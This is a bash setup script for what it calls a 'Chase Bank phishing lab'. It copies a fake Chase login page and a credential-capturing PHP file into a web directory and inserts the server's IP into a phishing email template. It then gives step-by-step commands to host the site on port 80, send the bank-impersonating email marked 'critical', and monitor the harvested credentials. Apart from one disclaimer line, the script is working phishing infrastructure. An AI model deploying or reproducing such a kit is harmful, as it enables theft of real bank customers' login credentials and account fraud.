#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Display banner
echo -e "${YELLOW}"
echo "╔═════════════════════════════════════════════════╗"
echo "║                                                 ║"
echo "║         CHASE BANK PHISHING LAB                 ║"
echo "║                                                 ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Create phishing site directory
echo -e "${YELLOW}[INFO]${NC} Setting up phishing site directory..."
mkdir -p phishing_site

# Copy files to the phishing site directory
cp chase_phishing.html phishing_site/index.html
cp credentials.php phishing_site/

# Get server IP
IP=$(ip addr show | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | head -n 1)
if [ -z "$IP" ]; then
    echo -e "${RED}[ERROR]${NC} Could not detect server IP address."
    echo -e "${YELLOW}[INFO]${NC} Please enter your server IP address manually:"
    read -p "> " IP
fi

echo -e "${GREEN}[SUCCESS]${NC} Using server IP: $IP"

# Update email template
echo -e "${YELLOW}[INFO]${NC} Updating email template with your server IP..."
sed -i "s|SERVER_URL|http://$IP|g" chase_email.html

# Setup complete
echo -e "${GREEN}[SUCCESS]${NC} Phishing lab setup complete!"

echo -e "\n${YELLOW}[INSTRUCTIONS]${NC} Follow these steps to run the phishing lab:"
echo -e "\n1. Start the web server:"
echo -e "   ${GREEN}sudo php -S 0.0.0.0:80 -t phishing_site/${NC}"
echo -e "   (Run this in a separate terminal window)"

echo -e "\n2. Send phishing email:"
echo -e "   ${GREEN}./send_email.sh -c chase_email.html -t \"Chase Bank\" -s security -u critical${NC}"
echo -e "   (Run this in a separate terminal window)"

echo -e "\n3. Monitor captured credentials:"
echo -e "   ${GREEN}./view_credentials.sh${NC}"
echo -e "   (Run this in a separate terminal window)"

echo -e "\n${YELLOW}[REMEMBER]${NC} This is for educational purposes only. Targeting individuals without their consent is illegal."

# Make scripts executable
chmod +x send_email.sh view_credentials.sh

exit 0 